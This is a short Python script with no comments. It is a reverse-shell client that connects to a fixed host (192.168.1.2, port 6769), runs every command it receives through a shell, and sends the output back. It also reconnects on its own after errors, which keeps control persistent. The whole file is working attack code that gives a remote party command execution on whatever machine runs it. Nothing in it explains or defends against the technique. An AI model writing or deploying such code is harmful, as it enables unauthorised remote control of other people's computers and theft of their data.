import os
import socket
import subprocess
import time

def socket_create():
    try:
        global host
        global port
        global s
        host = '192.168.1.2'
        port = 6769
        s = socket.socket()
    except socket.error as msg:
        print(f"Socket creation error: {str(msg)}")


def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
        print(f"Socket creation error: {str(msg)}")
        time.sleep(3)
        socket.connect()


def receive_commands():
    while True:
        data = s.recv(2048)
        if data[:2].decode("utf-8") == "cd":
            try:
                os.chdir(data[3:].decode("utf-8"))
            except:
                print("Something went wrong")
                pass
        if data[:].decode("utf-8") == "quit":
            s.close()
            break
        if len(data) > 0:
            try:
                cmd = subprocess.Popen(data[:].decode("utf-8"),  shell=True,
                               stdout=subprocess.PIPE, stderr= subprocess.PIPE,
                                       stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "utf-8")
                s.send(str.encode(output_str + str(os.getcwd())+ "> "))
            except:
                output_str = "Comand not recognized\n"
                s.send(str.encode(output_str + str(os.getcwd()) + "> "))
    s.close()


def main():
    global s
    try:
        socket_create()
        socket_connect()
        receive_commands()
    except:
        print("Error ocuered")
        time.sleep(3)
    s.close()
    main()

main()

